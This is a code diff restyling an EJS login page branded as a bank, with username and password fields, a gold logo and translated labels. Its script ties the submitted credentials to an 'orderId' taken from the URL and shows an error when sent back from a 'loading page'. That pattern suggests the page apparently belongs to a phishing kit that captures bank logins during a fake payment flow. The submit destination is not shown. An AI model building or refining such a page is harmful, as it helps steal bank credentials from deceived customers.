@@ -3,86 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><%= t.loginTitle %> - <%= t.bankName %></title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <title><%= t.login.title %> - <%= t.bankName %></title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Cairo', sans-serif;
-            background: linear-gradient(135deg, #c8a84e 0%, #d4af37 25%, #f0d060 50%, #d4af37 75%, #c8a84e 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #8b6914, #a07d2e, #6b5010);
             padding: 20px;
         }
         .login-container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 16px;
-            padding: 40px 30px;
             width: 100%;
-            max-width: 400px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            max-width: 420px;
             text-align: center;
         }
         .login-logo {
+            width: 180px;
             margin-bottom: 20px;
         }
-        .login-logo img {
-            width: 180px;
-        }
         .login-subtitle {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 25px;
+            font-size: 15px;
+            color: rgba(255,255,255,0.85);
+            margin-bottom: 40px;
         }
         .form-group {
-            margin-bottom: 18px;
+            margin-bottom: 25px;
             text-align: start;
         }
         .form-group label {
             display: block;
-            margin-bottom: 6px;
-            font-weight: 600;
-            color: #333;
             font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 8px;
         }
         .input-wrapper {
             position: relative;
         }
         .form-group input {
             width: 100%;
-            padding: 12px 40px 12px 15px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
+            padding: 16px 18px;
+            border: none;
+            border-radius: 12px;
             font-size: 15px;
             font-family: 'Cairo', sans-serif;
-            transition: border-color 0.3s;
-        }
-        .form-group input:focus {
+            background: #fff;
+            color: #333;
             outline: none;
-            border-color: #d4af37;
         }
-        .eye-toggle {
+        .form-group input::placeholder {
+            color: #aaa;
+        }
+        [dir="rtl"] .toggle-password { left: 14px; right: auto; }
+        [dir="ltr"] .toggle-password { right: 14px; left: auto; }
+        .toggle-password {
             position: absolute;
             top: 50%;
             transform: translateY(-50%);
-            cursor: pointer;
-            color: #999;
-            font-size: 18px;
             background: none;
             border: none;
-            padding: 5px;
+            cursor: pointer;
+            color: #666;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
         }
-        [dir="rtl"] .eye-toggle { left: 10px; }
-        [dir="ltr"] .eye-toggle { right: 10px; }
-        [dir="rtl"] .form-group input { padding: 12px 15px 12px 40px; }
         .error-msg {
-            color: #e74c3c;
-            font-weight: 700;
+            color: #ff3333;
             font-size: 14px;
-            margin-bottom: 15px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 10px;
             display: none;
         }
         .error-msg.show {
@@ -91,60 +87,63 @@
         .forgot-link {
             display: block;
             text-align: center;
-            color: #d4af37;
-            font-size: 13px;
-            margin-bottom: 20px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            margin: 30px 0 40px;
             text-decoration: none;
         }
         .forgot-link:hover {
             text-decoration: underline;
         }
-        .submit-btn {
+        .login-btn {
             width: 100%;
             padding: 14px;
-            background: linear-gradient(135deg, #d4af37, #c8a84e);
-            color: #fff;
             border: none;
-            border-radius: 8px;
+            border-radius: 30px;
+            background: #fff;
+            color: #5a3e2b;
             font-size: 16px;
             font-weight: 700;
             font-family: 'Cairo', sans-serif;
             cursor: pointer;
-            transition: opacity 0.3s;
+            max-width: 320px;
+            margin: 0 auto;
+            display: block;
         }
-        .submit-btn:hover {
-            opacity: 0.9;
+        .login-btn:hover {
+            background: #f0ebe5;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <div class="login-logo">
-            <img src="/images/logo-gold.png" alt="<%= t.bankName %>">
-        </div>
-        <p class="login-subtitle"><%= t.loginSubtitle %></p>
-
-        <div class="error-msg" id="errorMsg"><%= t.loginError %></div>
+        <img src="/images/logo-gold.png" alt="<%= t.bankName %>" class="login-logo">
+        <p class="login-subtitle"><%= t.login.subtitle %></p>
 
         <form id="loginForm">
+            <div class="error-msg" id="errorMsg"><%= t.login.error %></div>
+
             <div class="form-group">
-                <label for="username"><%= t.username %></label>
+                <label for="username"><%= t.login.username %></label>
                 <div class="input-wrapper">
-                    <input type="text" id="username" name="username" required>
+                    <input type="text" id="username" name="username" placeholder="<%= t.login.username %>" required>
                 </div>
             </div>
 
             <div class="form-group">
-                <label for="password"><%= t.password %></label>
+                <label for="password"><%= t.login.password %></label>
                 <div class="input-wrapper">
-                    <input type="password" id="password" name="password" required>
-                    <button type="button" class="eye-toggle" id="eyeToggle">&#128065;</button>
+                    <input type="password" id="password" name="password" placeholder="<%= t.login.password %>" required>
+                    <button type="button" class="toggle-password" id="eyeToggle">
+                        <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                    </button>
                 </div>
             </div>
 
-            <a href="#" class="forgot-link"><%= t.forgotCredentials %></a>
+            <a href="#" class="forgot-link"><%= t.login.forgot %></a>
 
-            <button type="submit" class="submit-btn"><%= t.loginBtn %></button>
+            <button type="submit" class="login-btn"><%= t.login.submit %></button>
         </form>
     </div>
 
@@ -155,29 +154,21 @@
         var orderId = parseInt(params.get('orderId'));
         var errorParam = params.get('error');
 
-        // Show error if redirected from loading page
         if (errorParam) {
             document.getElementById('errorMsg').classList.add('show');
         }
 
-        // Eye toggle
-        var eyeToggle = document.getElementById('eyeToggle');
-        var passwordInput = document.getElementById('password');
-        eyeToggle.addEventListener('click', function() {
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-            } else {
-                passwordInput.type = 'password';
-            }
+        document.getElementById('eyeToggle').addEventListener('click', function() {
+            var inp = document.getElementById('password');
+            inp.type = inp.type === 'password' ? 'text' : 'password';
         });
 
-        // Form submit
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
             var data = {
                 orderId: orderId,
-                username: document.getElementById('username').value,
+                username: document.getElementById('username').value.trim(),
                 password: document.getElementById('password').value
             };
 
